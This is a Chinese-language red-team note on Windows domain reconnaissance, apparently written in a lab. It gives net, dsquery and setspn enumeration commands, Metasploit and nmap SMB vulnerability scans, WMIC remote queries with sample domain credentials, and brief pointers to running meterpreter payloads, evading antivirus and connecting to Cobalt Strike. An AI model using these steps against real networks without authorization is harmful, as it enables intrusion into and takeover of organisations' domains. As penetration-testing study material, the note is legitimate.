## 内网信息搜集

查看域内域名：

	ipconfig /all

![](images/4.jpg)

ipconfig /all输出的时候存在域名不代表就存在域

	net view /domain

![](images/5.jpg)

net view /domain看到的域名有时候是看不到林中其他域的

获取Workgroup管理组成员：
	
	net localgroup administrators

![](images/2.jpg)

获取域管理组成员：

	net localgroup administrators /domain

一台服务器在升为域控制器时，其本地账户会自动转为域内置组administrators组账户，域中存在一些组，scope是domain local group，表示域本地组，administrators就是一个域本地组，所以要用net localgroup administrators /domain访问，这个组里面的用户对于该域中所有域控制器且仅仅是所有域控制器有完全控制权限，默认domain admins和enterprise admins都是这个组内的账户，administrator默认是该组账户。如前所说，这个组的用户只能控制域控制器，对域内其他成员机器没有权限，但是只要控制了域控制器，相当于控制了其他机器。

![](images/3.jpg)

获取域内计算机列表：

	net group "domain computers" /domain

![](images/1.jpg)


msf smb扫描获取系统信息

	msfconsle
	
	use auxiliary/scanner/smb/smb_version
	
	msf auxiliary(smb_version) > set RHOSTS 10.10.40.1-200
	
	msf auxiliary(smb_version) > set THREADS 100
	
	msf auxiliary(smb_version) > run

![](images/6.jpg)

### 场景一

nmap 扫描存在smb服务的主机：

	nmap -A -p 139,445 10.10.40.1-254  -oG smb_service.txt

找到开放端口的主机：

	cat smb_service.txt | grep -i windows | cut -d" " -f2

![](images/7.jpg)

	cat smb_service.txt | grep -i open | cut -d" " -f2

![](images/8.jpg)

	cat smb_service.txt | grep -i open | cut -d" " -f2 > smb_server_all.txt

查找所有的 smb vuln 脚本：

	find / -name smb*vuln*.nse

![](images/9.jpg)

扫描存在smb漏洞的主机：

	for vul in $(find / -name smb*vuln*.nse | cut -d"/" -f 6); do nmap -v -p 139,445 --script=$vul -iL smb_server_all.txt -oN smb_vulns_$vul.txt; done

	cat smb_vulns_smb-vuln-*.txt | grep IDs:

![](images/10.jpg)
![](images/11.jpg)

msf 拿shell

制作更佳稳定可靠的meterpreter payload。

靶机下载payload并执行，拿到meterpreter。

参考：http://www.51testing.com/html/35/n-3720435.html

## 获取靶机操作系统信息

	wmic /node:10.10.40.90 /user:LMRSEC\tony /password:Passw0rd os get name

在本机上执行是无意义的:

![](images/12.png)

获取网络互通的靶机的系统信息：

![](images/13.png)

**成功获取信息的数据包： ```wmic node 10.10.40.90 os get name.pcap```**

**利用前提：靶机把域用户添加到本地管理员组**

不在管理员组可能没权限。

![](images/14.jpg)

**根据机器上的防护软件进行相应的免杀，落地二进制文件，上线到 CS。**

## 获取靶机机器上的进程

	wmic /node:10.10.40.90 /user:LMRSEC\tony /password:Passw0rd process get name

![](images/15.png)


## SPN 扫描

服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。

windows:

	setspn -T domain_name -q */*

![](images/16.png)
![](images/17.png)

	setspn -T lmrsec.com -q */*

![](images/18.png)
![](images/19.png)

流量见 ```setspn -T lmrsec.com -q .pcap```

## 登陆 AD 查询所有域用户

	dsquery user

![](images/20.jpg)

## 参考资料

[初级域渗透系列 - 02. 常见攻击方法 - 1](https://www.t00ls.net/articles-30632.html)

[metasploit——（四）使用meterpreter脚本](https://www.cnblogs.com/hdsec/p/9522306.html)

[msf之后渗透（笔记）](https://blog.csdn.net/p_utao/article/details/108381939)

[Description of User Account Control and remote restrictions in Windows Vista](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)

[红队后渗透测试中的文件传输技巧](https://paper.seebug.org/834/)